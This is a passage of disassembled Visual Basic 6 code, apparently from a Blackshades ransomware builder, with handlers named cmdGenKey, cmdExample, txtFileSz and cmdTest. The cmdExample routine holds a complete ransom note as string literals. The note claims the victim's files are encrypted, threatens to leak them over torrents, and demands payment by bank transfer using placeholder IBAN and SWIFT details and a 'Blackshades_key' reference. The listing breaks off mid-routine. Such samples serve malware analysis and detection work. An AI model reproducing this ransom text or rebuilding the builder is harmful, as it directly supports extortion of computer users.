00855F48: push eax
00855F49: lea eax, var_40
00855F4C: push eax
00855F4D: push 00000007h
00855F4F: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
00855F54: add esp, 00000020h
00855F57: lea eax, var_00000168
00855F5D: push eax
00855F5E: lea eax, var_00000158
00855F64: push eax
00855F65: lea eax, var_00000148
00855F6B: push eax
00855F6C: lea eax, var_00000138
00855F72: push eax
00855F73: lea eax, var_00000128
00855F79: push eax
00855F7A: lea eax, var_00000118
00855F80: push eax
00855F81: lea eax, var_00000108
00855F87: push eax
00855F88: lea eax, var_000000F8
00855F8E: push eax
00855F8F: lea eax, var_000000E8
00855F95: push eax
00855F96: lea eax, var_000000D8
00855F9C: push eax
00855F9D: lea eax, var_000000C8
00855FA3: push eax
00855FA4: lea eax, var_000000B8
00855FAA: push eax
00855FAB: lea eax, var_000000A8
00855FB1: push eax
00855FB2: lea eax, var_00000098
00855FB8: push eax
00855FB9: lea eax, var_00000088
00855FBF: push eax
00855FC0: lea eax, var_78
00855FC3: push eax
00855FC4: lea eax, var_68
00855FC7: push eax
00855FC8: push 00000011h
00855FCA: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00855FCF: add esp, 00000048h
00855FD2: lea eax, var_0000016C
00855FD8: push eax
00855FD9: push 00000000h
00855FDB: call 0041092Eh ; msvbvm60.dll.__vbaAryDestruct
00855FE0: ret 
End Sub

Private sub cmdGenKey__856047
00856047: push ebp
00856048: mov ebp, esp
0085604A: sub esp, 0000000Ch
0085604D: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00856052: mov eax, fs:[00h]
00856058: push eax
00856059: mov fs:[00000000h], esp
00856060: push 0000003Ch
00856062: pop eax
00856063: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00856068: push ebx
00856069: push esi
0085606A: push edi
0085606B: mov var_0C, esp
0085606E: mov var_08, 0040C8D0h
00856075: mov eax, [ebp+08h]
00856078: and eax, 00000001h
0085607B: mov var_04, eax
0085607E: mov eax, [ebp+08h]
00856081: and al, FEh
00856083: mov [ebp+08h], eax
00856086: mov eax, [ebp+08h]
00856089: mov eax, [eax]
0085608B: push [ebp+08h]
0085608E: call [eax+04h]
00856091: mov eax, [ebp+08h]
00856094: mov eax, [eax]
00856096: push [ebp+08h]
00856099: call [eax+0000030Ch]
0085609F: push eax
008560A0: lea eax, var_1C
008560A3: push eax
008560A4: call 00410A84h ; Set (object)
008560A9: mov var_40, eax
008560AC: push 0000000Ch
008560AE: call 007C4EF8h
008560B3: mov var_24, eax
008560B6: mov var_2C, 00000008h
008560BD: lea eax, var_2C
008560C0: push eax
008560C1: lea eax, var_3C
008560C4: push eax
008560C5: call 00410760h ; arg_1 = Ucase(arg_2)
008560CA: lea eax, var_3C
008560CD: push eax
008560CE: lea eax, var_18
008560D1: push eax
008560D2: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
008560D7: push eax
008560D8: mov eax, var_40
008560DB: mov eax, [eax]
008560DD: push var_40
008560E0: call [eax+000000A4h]
008560E6: fclex 
008560E8: mov var_44, eax
008560EB: cmp var_44, 00000000h
008560EF: jnl 85610Bh
008560F1: push 000000A4h
008560F6: push 00440E08h
008560FB: push var_40
008560FE: push var_44
00856101: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00856106: mov var_50, eax
00856109: jmp 85610Fh
0085610B: and var_50, 00000000h
0085610F: lea ecx, var_18
00856112: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00856117: lea ecx, var_1C
0085611A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085611F: lea eax, var_3C
00856122: push eax
00856123: lea eax, var_2C
00856126: push eax
00856127: push 00000002h
00856129: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0085612E: add esp, 0000000Ch
00856131: mov var_04, 00000000h
00856138: push 00856163h
0085613D: jmp 856162h
0085613F: lea ecx, var_18
00856142: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00856147: lea ecx, var_1C
0085614A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085614F: lea eax, var_3C
00856152: push eax
00856153: lea eax, var_2C
00856156: push eax
00856157: push 00000002h
00856159: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
0085615E: add esp, 0000000Ch
00856161: ret 
End Sub

Private sub cmdExample__854380
00854380: push ebp
00854381: mov ebp, esp
00854383: sub esp, 0000000Ch
00854386: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
0085438B: mov eax, fs:[00h]
00854391: push eax
00854392: mov fs:[00000000h], esp
00854399: push 00000070h
0085439B: pop eax
0085439C: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008543A1: push ebx
008543A2: push esi
008543A3: push edi
008543A4: mov var_0C, esp
008543A7: mov var_08, 0040C8B0h
008543AE: mov eax, [ebp+08h]
008543B1: and eax, 00000001h
008543B4: mov var_04, eax
008543B7: mov eax, [ebp+08h]
008543BA: and al, FEh
008543BC: mov [ebp+08h], eax
008543BF: mov eax, [ebp+08h]
008543C2: mov eax, [eax]
008543C4: push [ebp+08h]
008543C7: call [eax+04h]
008543CA: mov eax, [ebp+08h]
008543CD: mov eax, [eax]
008543CF: push [ebp+08h]
008543D2: call [eax+0000031Ch]
008543D8: push eax
008543D9: lea eax, var_68
008543DC: push eax
008543DD: call 00410A84h ; Set (object)
008543E2: mov var_6C, eax
008543E5: push 00455354h ; ATTENTION!
008543EA: mov eax, var_6C
008543ED: mov eax, [eax]
008543EF: push var_6C
008543F2: call [eax+000000A4h]
008543F8: fclex 
008543FA: mov var_70, eax
008543FD: cmp var_70, 00000000h
00854401: jnl 85441Dh
00854403: push 000000A4h
00854408: push 00440E08h
0085440D: push var_6C
00854410: push var_70
00854413: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00854418: mov var_7C, eax
0085441B: jmp 854421h
0085441D: and var_7C, 00000000h
00854421: lea ecx, var_68
00854424: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00854429: mov eax, [ebp+08h]
0085442C: mov eax, [eax]
0085442E: push [ebp+08h]
00854431: call [eax+00000320h]
00854437: push eax
00854438: lea eax, var_68
0085443B: push eax
0085443C: call 00410A84h ; Set (object)
00854441: mov var_6C, eax
00854444: push 00455370h ; Warning! Please take your time to read the following text for your own best.
00854449: push 00441264h ; vbCrLf
0085444E: call 00410A18h ; &
00854453: mov edx, eax
00854455: lea ecx, var_18
00854458: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0085445D: push eax
0085445E: push 0045547Ch ; Your computer has basically been hijacked, and your private files stored on your computer has now been encrypted, which means that they are impossible to access, and can only be decryped/restored by us.
00854463: call 00410A18h ; &
00854468: mov edx, eax
0085446A: lea ecx, var_1C
0085446D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854472: push eax
00854473: push 00441264h ; vbCrLf
00854478: call 00410A18h ; &
0085447D: mov edx, eax
0085447F: lea ecx, var_20
00854482: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854487: push eax
00854488: push 00441264h ; vbCrLf
0085448D: call 00410A18h ; &
00854492: mov edx, eax
00854494: lea ecx, var_24
00854497: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0085449C: push eax
0085449D: push 00455660h ; Now, it's your decision to choose whether to ignore this, or follow the easy instructions to get your files back.
008544A2: call 00410A18h ; &
008544A7: mov edx, eax
008544A9: lea ecx, var_28
008544AC: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008544B1: push eax
008544B2: push 00441264h ; vbCrLf
008544B7: call 00410A18h ; &
008544BC: mov edx, eax
008544BE: lea ecx, var_2C
008544C1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008544C6: push eax
008544C7: push 00455850h ; By ignoring this and restarting your computer, your private files (listed in the box below) will remain encrypted, and shared over file sharing protocols, such as torrents, so that might be a bad idea.
008544CC: call 00410A18h ; &
008544D1: mov edx, eax
008544D3: lea ecx, var_30
008544D6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008544DB: push eax
008544DC: push 00441264h ; vbCrLf
008544E1: call 00410A18h ; &
008544E6: mov edx, eax
008544E8: lea ecx, var_34
008544EB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008544F0: push eax
008544F1: push 00441264h ; vbCrLf
008544F6: call 00410A18h ; &
008544FB: mov edx, eax
008544FD: lea ecx, var_38
00854500: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854505: push eax
00854506: push 00455748h ; In order to get your files back, please read the following instructions below:
0085450B: call 00410A18h ; &
00854510: mov edx, eax
00854512: lea ecx, var_3C
00854515: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0085451A: push eax
0085451B: mov eax, var_6C
0085451E: mov eax, [eax]
00854520: push var_6C
00854523: call [eax+000000A4h]
00854529: fclex 
0085452B: mov var_70, eax
0085452E: cmp var_70, 00000000h
00854532: jnl 85454Eh
00854534: push 000000A4h
00854539: push 00440E08h
0085453E: push var_6C
00854541: push var_70
00854544: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00854549: mov var_80, eax
0085454C: jmp 854552h
0085454E: and var_80, 00000000h
00854552: lea eax, var_3C
00854555: push eax
00854556: lea eax, var_38
00854559: push eax
0085455A: lea eax, var_34
0085455D: push eax
0085455E: lea eax, var_30
00854561: push eax
00854562: lea eax, var_2C
00854565: push eax
00854566: lea eax, var_28
00854569: push eax
0085456A: lea eax, var_24
0085456D: push eax
0085456E: lea eax, var_20
00854571: push eax
00854572: lea eax, var_1C
00854575: push eax
00854576: lea eax, var_18
00854579: push eax
0085457A: push 0000000Ah
0085457C: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00854581: add esp, 0000002Ch
00854584: lea ecx, var_68
00854587: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085458C: mov eax, [ebp+08h]
0085458F: mov eax, [eax]
00854591: push [ebp+08h]
00854594: call [eax+00000324h]
0085459A: push eax
0085459B: lea eax, var_68
0085459E: push eax
0085459F: call 00410A84h ; Set (object)
008545A4: mov var_6C, eax
008545A7: push 004557ECh ; Please settle X USD
008545AC: push 00441264h ; vbCrLf
008545B1: call 00410A18h ; &
008545B6: mov edx, eax
008545B8: lea ecx, var_18
008545BB: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008545C0: push eax
008545C1: push 004559E8h ; IBAN:  XX27 0040 0168 0000 0178 2101 XXXX
008545C6: call 00410A18h ; &
008545CB: mov edx, eax
008545CD: lea ecx, var_1C
008545D0: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008545D5: push eax
008545D6: push 00441264h ; vbCrLf
008545DB: call 00410A18h ; &
008545E0: mov edx, eax
008545E2: lea ecx, var_20
008545E5: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008545EA: push eax
008545EB: push 00455818h ; SWIFT: XX XX XXXXX XXXXXX
008545F0: call 00410A18h ; &
008545F5: mov edx, eax
008545F7: lea ecx, var_24
008545FA: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008545FF: push eax
00854600: push 00441264h ; vbCrLf
00854605: call 00410A18h ; &
0085460A: mov edx, eax
0085460C: lea ecx, var_28
0085460F: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854614: push eax
00854615: push 00455618h ; Account: IBAN505010100000225-1000
0085461A: call 00410A18h ; &
0085461F: mov edx, eax
00854621: lea ecx, var_2C
00854624: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854629: push eax
0085462A: push 00441264h ; vbCrLf
0085462F: call 00410A18h ; &
00854634: mov edx, eax
00854636: lea ecx, var_30
00854639: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0085463E: push eax
0085463F: push 00455410h ; Name: Somename Somelastname
00854644: call 00410A18h ; &
00854649: mov edx, eax
0085464B: lea ecx, var_34
0085464E: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854653: push eax
00854654: push 00441264h ; vbCrLf
00854659: call 00410A18h ; &
0085465E: mov edx, eax
00854660: lea ecx, var_38
00854663: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854668: push eax
00854669: push 0045544Ch ; City: Somecity
0085466E: call 00410A18h ; &
00854673: mov edx, eax
00854675: lea ecx, var_3C
00854678: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0085467D: push eax
0085467E: push 00441264h ; vbCrLf
00854683: call 00410A18h ; &
00854688: mov edx, eax
0085468A: lea ecx, var_40
0085468D: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854692: push eax
00854693: push 00441264h ; vbCrLf
00854698: call 00410A18h ; &
0085469D: mov edx, eax
0085469F: lea ecx, var_44
008546A2: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008546A7: push eax
008546A8: push 00455A40h ; Reference: Blackshades_key (WARNING: This must be included as a message or reference, otherwise your files will not be restored)
008546AD: call 00410A18h ; &
008546B2: mov edx, eax
008546B4: lea ecx, var_48
008546B7: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008546BC: push eax
008546BD: push 00441264h ; vbCrLf
008546C2: call 00410A18h ; &
008546C7: mov edx, eax
008546C9: lea ecx, var_4C
008546CC: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008546D1: push eax
008546D2: push 00441264h ; vbCrLf
008546D7: call 00410A18h ; &
008546DC: mov edx, eax
008546DE: lea ecx, var_50
008546E1: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008546E6: push eax
008546E7: push 00455B48h ; Please write down this information before the timer runs out, and then restart your computer.
008546EC: call 00410A18h ; &
008546F1: mov edx, eax
008546F3: lea ecx, var_54
008546F6: call 00410A24h ; msvbvm60.dll.__vbaStrMove
008546FB: push eax
008546FC: push 00441264h ; vbCrLf
00854701: call 00410A18h ; &
00854706: mov edx, eax
00854708: lea ecx, var_58
0085470B: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854710: push eax
00854711: push 00455C30h ; You might want to check and verify that your files has actually been locked.
00854716: call 00410A18h ; &
0085471B: mov edx, eax
0085471D: lea ecx, var_5C
00854720: call 00410A24h ; msvbvm60.dll.__vbaStrMove
00854725: push eax
00854726: push 00441264h ; vbCrLf
0085472B: call 00410A18h ; &
00854730: mov edx, eax
00854732: lea ecx, var_60
00854735: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0085473A: push eax
0085473B: push 00455CD0h ; Later on, if you feel like sending the payment, then do it. Once the payment has been received, your files will be be fully restored within 24 hours.
00854740: call 00410A18h ; &
00854745: mov edx, eax
00854747: lea ecx, var_64
0085474A: call 00410A24h ; msvbvm60.dll.__vbaStrMove
0085474F: push eax
00854750: mov eax, var_6C
00854753: mov eax, [eax]
00854755: push var_6C
00854758: call [eax+000000A4h]
0085475E: fclex 
00854760: mov var_70, eax
00854763: cmp var_70, 00000000h
00854767: jnl 854786h
00854769: push 000000A4h
0085476E: push 00440E08h
00854773: push var_6C
00854776: push var_70
00854779: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
0085477E: mov var_00000084, eax
00854784: jmp 85478Dh
00854786: and var_00000084, 00000000h
0085478D: lea eax, var_64
00854790: push eax
00854791: lea eax, var_60
00854794: push eax
00854795: lea eax, var_5C
00854798: push eax
00854799: lea eax, var_58
0085479C: push eax
0085479D: lea eax, var_54
008547A0: push eax
008547A1: lea eax, var_50
008547A4: push eax
008547A5: lea eax, var_4C
008547A8: push eax
008547A9: lea eax, var_48
008547AC: push eax
008547AD: lea eax, var_44
008547B0: push eax
008547B1: lea eax, var_40
008547B4: push eax
008547B5: lea eax, var_3C
008547B8: push eax
008547B9: lea eax, var_38
008547BC: push eax
008547BD: lea eax, var_34
008547C0: push eax
008547C1: lea eax, var_30
008547C4: push eax
008547C5: lea eax, var_2C
008547C8: push eax
008547C9: lea eax, var_28
008547CC: push eax
008547CD: lea eax, var_24
008547D0: push eax
008547D1: lea eax, var_20
008547D4: push eax
008547D5: lea eax, var_1C
008547D8: push eax
008547D9: lea eax, var_18
008547DC: push eax
008547DD: push 00000014h
008547DF: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008547E4: add esp, 00000054h
008547E7: lea ecx, var_68
008547EA: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008547EF: mov var_04, 00000000h
008547F6: push 00854861h
008547FB: jmp 854860h
008547FD: lea eax, var_64
00854800: push eax
00854801: lea eax, var_60
00854804: push eax
00854805: lea eax, var_5C
00854808: push eax
00854809: lea eax, var_58
0085480C: push eax
0085480D: lea eax, var_54
00854810: push eax
00854811: lea eax, var_50
00854814: push eax
00854815: lea eax, var_4C
00854818: push eax
00854819: lea eax, var_48
0085481C: push eax
0085481D: lea eax, var_44
00854820: push eax
00854821: lea eax, var_40
00854824: push eax
00854825: lea eax, var_3C
00854828: push eax
00854829: lea eax, var_38
0085482C: push eax
0085482D: lea eax, var_34
00854830: push eax
00854831: lea eax, var_30
00854834: push eax
00854835: lea eax, var_2C
00854838: push eax
00854839: lea eax, var_28
0085483C: push eax
0085483D: lea eax, var_24
00854840: push eax
00854841: lea eax, var_20
00854844: push eax
00854845: lea eax, var_1C
00854848: push eax
00854849: lea eax, var_18
0085484C: push eax
0085484D: push 00000014h
0085484F: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00854854: add esp, 00000054h
00854857: lea ecx, var_68
0085485A: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
0085485F: ret 
End Sub

Private sub txtFileSz__857E3D
00857E3D: push ebp
00857E3E: mov ebp, esp
00857E40: sub esp, 00000018h
00857E43: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
00857E48: mov eax, fs:[00h]
00857E4E: push eax
00857E4F: mov fs:[00000000h], esp
00857E56: mov eax, 00000088h
00857E5B: call 004106A0h ; msvbvm60.dll.__vbaChkstk
00857E60: push ebx
00857E61: push esi
00857E62: push edi
00857E63: mov var_18, esp
00857E66: mov var_14, 0040C918h
00857E6D: mov eax, [ebp+08h]
00857E70: and eax, 00000001h
00857E73: mov var_10, eax
00857E76: mov eax, [ebp+08h]
00857E79: and al, FEh
00857E7B: mov [ebp+08h], eax
00857E7E: mov var_0C, 00000000h
00857E85: mov eax, [ebp+08h]
00857E88: mov eax, [eax]
00857E8A: push [ebp+08h]
00857E8D: call [eax+04h]
00857E90: mov var_04, 00000001h
00857E97: mov var_04, 00000002h
00857E9E: push FFFFFFFFh
00857EA0: call 00410A60h ; On Error ...
00857EA5: mov var_04, 00000003h
00857EAC: mov eax, [ebp+08h]
00857EAF: mov eax, [eax]
00857EB1: push [ebp+08h]
00857EB4: call [eax+00000304h]
00857EBA: push eax
00857EBB: lea eax, var_2C
00857EBE: push eax
00857EBF: call 00410A84h ; Set (object)
00857EC4: mov var_78, eax
00857EC7: lea eax, var_24
00857ECA: push eax
00857ECB: mov eax, var_78
00857ECE: mov eax, [eax]
00857ED0: push var_78
00857ED3: call [eax+000000A0h]
00857ED9: fclex 
00857EDB: mov var_7C, eax
00857EDE: cmp var_7C, 00000000h
00857EE2: jnl 857F01h
00857EE4: push 000000A0h
00857EE9: push 00440E08h
00857EEE: push var_78
00857EF1: push var_7C
00857EF4: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00857EF9: mov var_000000A0, eax
00857EFF: jmp 857F08h
00857F01: and var_000000A0, 00000000h
00857F08: mov eax, [ebp+08h]
00857F0B: mov eax, [eax]
00857F0D: push [ebp+08h]
00857F10: call [eax+00000304h]
00857F16: mov var_3C, eax
00857F19: mov var_44, 00000009h
00857F20: push var_24
00857F23: call 0041098Eh ; Len(arg_1)
00857F28: xor ebx, ebx
00857F2A: test eax, eax
00857F2C: setnle bl
00857F2F: neg ebx
00857F31: lea eax, var_44
00857F34: push eax
00857F35: call 004109EEh ; IsNumeric(arg_1)
00857F3A: neg ax
00857F3D: sbb eax, eax
00857F3F: inc eax
00857F40: neg eax
00857F42: and bx, ax
00857F45: mov var_80, bx
00857F49: lea ecx, var_24
00857F4C: call 00410A66h ; msvbvm60.dll.__vbaFreeStr
00857F51: lea ecx, var_2C
00857F54: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00857F59: lea ecx, var_44
00857F5C: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00857F61: movsx eax, word ptr var_80
00857F65: test eax, eax
00857F67: jz 008580E0h
00857F6D: mov var_04, 00000004h
00857F74: mov eax, [ebp+08h]
00857F77: mov eax, [eax]
00857F79: push [ebp+08h]
00857F7C: call [eax+00000304h]
00857F82: push eax
00857F83: lea eax, var_34
00857F86: push eax
00857F87: call 00410A84h ; Set (object)
00857F8C: mov eax, [ebp+08h]
00857F8F: mov eax, [eax]
00857F91: push [ebp+08h]
00857F94: call [eax+00000304h]
00857F9A: push eax
00857F9B: lea eax, var_30
00857F9E: push eax
00857F9F: call 00410A84h ; Set (object)
00857FA4: mov var_80, eax
00857FA7: mov eax, [ebp+08h]
00857FAA: mov eax, [eax]
00857FAC: push [ebp+08h]
00857FAF: call [eax+00000304h]
00857FB5: push eax
00857FB6: lea eax, var_2C
00857FB9: push eax
00857FBA: call 00410A84h ; Set (object)
00857FBF: mov var_78, eax
00857FC2: lea eax, var_24
00857FC5: push eax
00857FC6: mov eax, var_78
00857FC9: mov eax, [eax]
00857FCB: push var_78
00857FCE: call [eax+000000A0h]
00857FD4: fclex 
00857FD6: mov var_7C, eax
00857FD9: cmp var_7C, 00000000h
00857FDD: jnl 857FFCh
00857FDF: push 000000A0h
00857FE4: push 00440E08h
00857FE9: push var_78
00857FEC: push var_7C
00857FEF: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00857FF4: mov var_000000A4, eax
00857FFA: jmp 858003h
00857FFC: and var_000000A4, 00000000h
00858003: push var_24
00858006: call 0041098Eh ; Len(arg_1)
0085800B: sub eax, 00000001h
0085800E: jo 00858178h
00858014: mov var_4C, eax
00858017: mov var_54, 00000003h
0085801E: mov eax, var_34
00858021: mov var_0000009C, eax
00858027: and var_34, 00000000h
0085802B: mov eax, var_0000009C
00858031: mov var_3C, eax
00858034: mov var_44, 00000009h
0085803B: lea eax, var_54
0085803E: push eax
0085803F: push 00000001h
00858041: lea eax, var_44
00858044: push eax
00858045: lea eax, var_64
00858048: push eax
00858049: call 00410772h ; arg_1 = Mid$(arg_2, arg_3, arg_4)
0085804E: lea eax, var_64
00858051: push eax
00858052: lea eax, var_28
00858055: push eax
00858056: call 0041097Ch ; msvbvm60.dll.__vbaStrVarVal
0085805B: push eax
0085805C: mov eax, var_80
0085805F: mov eax, [eax]
00858061: push var_80
00858064: call [eax+000000A4h]
0085806A: fclex 
0085806C: mov var_00000084, eax
00858072: cmp var_00000084, 00000000h
00858079: jnl 85809Bh
0085807B: push 000000A4h
00858080: push 00440E08h
00858085: push var_80
00858088: push var_00000084
0085808E: call 00410A5Ah ; msvbvm60.dll.__vbaHresultCheckObj
00858093: mov var_000000A8, eax
00858099: jmp 8580A2h
0085809B: and var_000000A8, 00000000h
008580A2: lea eax, var_28
008580A5: push eax
008580A6: lea eax, var_24
008580A9: push eax
008580AA: push 00000002h
008580AC: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
008580B1: add esp, 0000000Ch
008580B4: lea eax, var_34
008580B7: push eax
008580B8: lea eax, var_30
008580BB: push eax
008580BC: lea eax, var_2C
008580BF: push eax
008580C0: push 00000003h
008580C2: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
008580C7: add esp, 00000010h
008580CA: lea eax, var_64
008580CD: push eax
008580CE: lea eax, var_54
008580D1: push eax
008580D2: lea eax, var_44
008580D5: push eax
008580D6: push 00000003h
008580D8: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
008580DD: add esp, 00000010h
008580E0: mov var_04, 00000006h
008580E7: mov var_3C, 80020004h
008580EE: mov var_44, 0000000Ah
008580F5: lea eax, var_44
008580F8: push eax
008580F9: push 0044AED4h ; {End}
008580FE: call 00410736h ; SendKeys
00858103: lea ecx, var_44
00858106: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0085810B: mov var_10, 00000000h
00858112: push 00858159h
00858117: jmp 858158h
00858119: lea eax, var_28
0085811C: push eax
0085811D: lea eax, var_24
00858120: push eax
00858121: push 00000002h
00858123: call 00410A12h ; msvbvm60.dll.__vbaFreeStrList
00858128: add esp, 0000000Ch
0085812B: lea eax, var_34
0085812E: push eax
0085812F: lea eax, var_30
00858132: push eax
00858133: lea eax, var_2C
00858136: push eax
00858137: push 00000003h
00858139: call 00410A48h ; msvbvm60.dll.__vbaFreeObjList
0085813E: add esp, 00000010h
00858141: lea eax, var_64
00858144: push eax
00858145: lea eax, var_54
00858148: push eax
00858149: lea eax, var_44
0085814C: push eax
0085814D: push 00000003h
0085814F: call 00410A42h ; msvbvm60.dll.__vbaFreeVarList
00858154: add esp, 00000010h
00858157: ret 
End Sub

Private sub cmdTest__856297
00856297: push ebp
00856298: mov ebp, esp
0085629A: sub esp, 0000000Ch
0085629D: push 004106A6h ; msvbvm60.dll.__vbaExceptHandler
008562A2: mov eax, fs:[00h]
008562A8: push eax
008562A9: mov fs:[00000000h], esp
008562B0: mov eax, 000000D4h
008562B5: call 004106A0h ; msvbvm60.dll.__vbaChkstk
008562BA: push ebx
008562BB: push esi
008562BC: push edi
008562BD: mov var_0C, esp
008562C0: mov var_08, 0040C8E8h
008562C7: mov eax, [ebp+08h]
008562CA: and eax, 00000001h
008562CD: mov var_04, eax
008562D0: mov eax, [ebp+08h]
008562D3: and al, FEh
008562D5: mov [ebp+08h], eax
008562D8: mov eax, [ebp+08h]
008562DB: mov eax, [eax]
008562DD: push [ebp+08h]
008562E0: call [eax+04h]
008562E3: push 00000000h
008562E5: push 0000000Fh
008562E7: mov eax, [ebp+08h]
008562EA: mov eax, [eax]
008562EC: push [ebp+08h]
008562EF: call [eax+0000033Ch]
008562F5: push eax
008562F6: lea eax, var_48
008562F9: push eax
008562FA: call 00410A84h ; Set (object)
008562FF: push eax
00856300: lea eax, var_60
00856303: push eax
00856304: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
00856309: add esp, 00000010h
0085630C: push eax
0085630D: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00856312: mov var_000000A8, eax
00856318: lea ecx, var_48
0085631B: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856320: lea ecx, var_60
00856323: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
00856328: mov eax, var_000000A8
0085632E: mov var_000000C0, eax
00856334: cmp var_000000C0, 00000007h
0085633B: jnbe 85638Dh
0085633D: mov eax, var_000000C0
00856343: jmp [eax*4+0085695Fh]
0085634A: and var_30, 00000000h
0085634E: jmp 85638Dh
00856350: mov var_30, 00FF0000h
00856357: jmp 85638Dh
00856359: mov var_30, 00FFFF00h
00856360: jmp 85638Dh
00856362: mov var_30, 0000FF00h
00856369: jmp 85638Dh
0085636B: mov var_30, 00FF00FFh
00856372: jmp 85638Dh
00856374: mov var_30, 000000FFh
0085637B: jmp 85638Dh
0085637D: mov var_30, 00FFFFFFh
00856384: jmp 85638Dh
00856386: mov var_30, 0000FFFFh
0085638D: push 00000000h
0085638F: push 0000000Fh
00856391: mov eax, [ebp+08h]
00856394: mov eax, [eax]
00856396: push [ebp+08h]
00856399: call [eax+0000034Ch]
0085639F: push eax
008563A0: lea eax, var_48
008563A3: push eax
008563A4: call 00410A84h ; Set (object)
008563A9: push eax
008563AA: lea eax, var_60
008563AD: push eax
008563AE: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
008563B3: add esp, 00000010h
008563B6: push eax
008563B7: call 00410A90h ; msvbvm60.dll.__vbaI4Var
008563BC: mov var_000000AC, eax
008563C2: lea ecx, var_48
008563C5: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
008563CA: lea ecx, var_60
008563CD: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
008563D2: mov eax, var_000000AC
008563D8: mov var_000000C4, eax
008563DE: cmp var_000000C4, 00000007h
008563E5: jnbe 856437h
008563E7: mov eax, var_000000C4
008563ED: jmp [eax*4+0085697Fh]
008563F4: and var_1C, 00000000h
008563F8: jmp 856437h
008563FA: mov var_1C, 00FF0000h
00856401: jmp 856437h
00856403: mov var_1C, 00FFFF00h
0085640A: jmp 856437h
0085640C: mov var_1C, 0000FF00h
00856413: jmp 856437h
00856415: mov var_1C, 00FF00FFh
0085641C: jmp 856437h
0085641E: mov var_1C, 000000FFh
00856425: jmp 856437h
00856427: mov var_1C, 00FFFFFFh
0085642E: jmp 856437h
00856430: mov var_1C, 0000FFFFh
00856437: push 00000000h
00856439: push 0000000Fh
0085643B: mov eax, [ebp+08h]
0085643E: mov eax, [eax]
00856440: push [ebp+08h]
00856443: call [eax+00000340h]
00856449: push eax
0085644A: lea eax, var_48
0085644D: push eax
0085644E: call 00410A84h ; Set (object)
00856453: push eax
00856454: lea eax, var_60
00856457: push eax
00856458: call 00410A8Ah ; msvbvm60.dll.__vbaLateIdCallLd
0085645D: add esp, 00000010h
00856460: push eax
00856461: call 00410A90h ; msvbvm60.dll.__vbaI4Var
00856466: mov var_000000B0, eax
0085646C: lea ecx, var_48
0085646F: call 00410A7Eh ; msvbvm60.dll.__vbaFreeObj
00856474: lea ecx, var_60
00856477: call 00410A78h ; msvbvm60.dll.__vbaFreeVar
0085647C: mov eax, var_000000B0
00856482: mov var_000000C8, eax
00856488: cmp var_000000C8, 00000007h
0085648F: jnbe 8564E1h
00856491: mov eax, var_000000C8
00856497: jmp [eax*4+0085699Fh]
0085649E: and var_38, 00000000h
008564A2: jmp 8564E1h
008564A4: mov var_38, 00FF0000h
008564AB: jmp 8564E1h
008564AD: mov var_38, 00FFFF00h
008564B4: jmp 8564E1h
008564B6: mov var_38, 0000FF00h
008564BD: jmp 8564E1h
